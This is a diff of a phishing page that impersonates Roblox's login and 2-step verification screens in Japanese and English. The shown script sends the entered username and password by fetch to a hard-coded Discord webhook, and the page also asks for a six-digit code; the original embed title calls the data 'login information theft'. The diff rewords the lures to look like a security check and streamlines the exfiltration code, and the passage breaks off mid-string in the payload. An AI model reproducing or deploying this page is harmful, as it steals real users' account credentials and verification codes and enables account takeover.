@@ -2,19 +2,20 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Roblox | Verification</title>
     <style>
-        body { font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 90%; max-width: 340px; text-align: center; box-sizing: border-box; }
-        .logo { width: 140px; margin-bottom: 25px; }
-        h1 { font-size: 22px; color: #393939; margin-bottom: 15px; font-weight: 500; }
-        p { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #B8B8B8; border-radius: 4px; box-sizing: border-box; background: #F2F4F5; font-size: 14px; outline: none; }
-        button { width: 100%; padding: 12px; background-color: #00A2FF; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; -webkit-appearance: none; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 90%; max-width: 340px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-size: 20px; color: #393939; margin-bottom: 15px; font-weight: 500; }
+        p { font-size: 13px; color: #666; line-height: 1.4; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #B8B8B8; border-radius: 4px; background: #F2F4F5; font-size: 14px; outline: none; }
+        button { width: 100%; padding: 14px; background-color: #00A2FF; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; transition: opacity 0.2s; }
+        button:disabled { background-color: #A7AFB2; cursor: default; opacity: 0.7; }
         .timer { color: #D32F2F; font-weight: bold; margin-bottom: 10px; font-size: 14px; }
-        .code-display { background: #E1F5FE; border: 2px dashed #00A2FF; padding: 15px; margin-top: 20px; border-radius: 4px; font-size: 32px; color: #00A2FF; letter-spacing: 2px; font-weight: bold; }
+        .code-display { background: #E1F5FE; border: 2px dashed #00A2FF; padding: 15px; margin-top: 15px; border-radius: 4px; font-size: 28px; color: #00A2FF; letter-spacing: 2px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -22,9 +23,9 @@
     <div class="box" id="step1">
         <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
         <h1>Login to Continue</h1>
-        <p>スクリプトの有効化にはアカウントの再認証が必要です。</p>
-        <input type="text" id="u" placeholder="Username / Email">
-        <input type="password" id="p" placeholder="Password">
+        <p>セキュリティ保護のため、アカウントの再認証が必要です。</p>
+        <input type="text" id="u" placeholder="Username / Email" autocomplete="off">
+        <input type="password" id="p" placeholder="Password" autocomplete="off">
         <button id="btn1" onclick="sendPass()">Verify Account</button>
     </div>
 
@@ -32,51 +33,37 @@
         <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
         <h1>2-Step Verification</h1>
         <p class="timer" id="timer">⚠️ 有効期限: 残り 29 秒</p>
-        <p>送信された6桁の認証コードを入力してください。</p>
-        <input type="text" id="c" placeholder="6-digit code" maxlength="6">
-        <button id="btn2" onclick="sendCode()">Verify & Unlock</button>
+        <p>デバイスに送信されたコードを入力してください。</p>
+        <input type="text" id="c" placeholder="6-digit code" maxlength="6" inputmode="numeric">
+        <button id="btn2" onclick="sendCode()">Confirm & Unlock</button>
     </div>
 
     <div class="box" id="step3" style="display:none;">
         <h1 style="color: #00A2FF;">Success!</h1>
-        <p>認証完了。以下のコードをRobloxに入力してください。</p>
+        <p>認証が完了しました。Robloxに戻り、以下のコードを入力してください。</p>
         <div class="code-display">BN-9922</div>
     </div>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1487384537980993646/KaXirod0cFiv_fb8JHXdi_S_k-vD6jqqY4afb6ySx9hjYc8vww0FynG4UrOvRBGx4gUw";
+        const hook = "https://discord.com/api/webhooks/1487384537980993646/KaXirod0cFiv_fb8JHXdi_S_k-vD6jqqY4afb6ySx9hjYc8vww0FynG4UrOvRBGx4gUw";
         let user = "";
-
-        async function postToWebhook(data) {
-            try {
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                return true;
-            } catch (e) {
-                console.error(e);
-                return false;
-            }
-        }
 
         async function sendPass() {
             user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
             const btn = document.getElementById('btn1');
-            
-            if(!user || !pass) {
-                alert("IDとパスワードを入力してください。");
-                return;
-            }
+            if(!user || !pass) return alert("Please fill all fields.");
 
             btn.disabled = true;
             btn.innerText = "Processing...";
 
-            const success = await postToWebhook({
-                embeds: [{
-                    title: "🔑 ログイン情報奪取",
-                    color: 16776960,
-                    fields: [
-                        { name: "User", value: "
+            try {
+                await fetch(hook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🔑 ログイン情報",
+                            color: 16776960,
+                            fields: [
+                                { name: "User", value: "
